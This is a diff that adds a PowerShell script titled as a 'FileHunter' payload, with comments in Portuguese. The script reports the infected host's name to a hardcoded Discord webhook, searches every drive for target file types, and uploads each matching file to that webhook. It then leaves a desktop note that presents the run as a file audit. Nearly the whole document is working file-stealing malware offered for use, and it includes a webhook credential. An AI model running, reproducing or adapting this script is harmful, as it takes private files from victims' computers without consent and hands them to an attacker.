@@ -1,0 +1,28 @@
+# PAYLOAD (.ps1) - FileHunter Staged Version
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# Alvos: Define aqui o padrão de ficheiro (ex: *.jpg, documentos.docx, etc)
+$e = @('example.jpg') # Podes adicionar mais: @('*.jpg','*.pdf')
+
+# Notificação de início de varredura
+curl.exe -k -s -F ('payload=' + [char]64 + 'FileHunter iniciado no host: ' + $env:COMPUTERNAME) $u
+
+# Varredura de todas as unidades de sistema
+$found = New-Object System.Collections.Generic.List[string]
+Get-PSDrive -PSProvider FileSystem | ForEach-Object {
+    $root = $_.Root
+    Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        if ($_.Length -lt 24MB) {
+            # Exfiltração imediata para evitar perda de dados se o processo for interrompido
+            $a = 'file=' + [char]64 + $_.FullName
+            curl.exe -k -s -F $a $u
+            $found.Add($_.Name)
+        }
+    }
+}
+
+# Relatório final no Ambiente de Trabalho (mantendo a lógica do script original)
+$msg = "A auditoria de ficheiros terminou. Encontrados: " + $found.Count
+Set-Content -Path "$env:USERPROFILE\Desktop\fyi.txt" -Value $msg
+
+exit
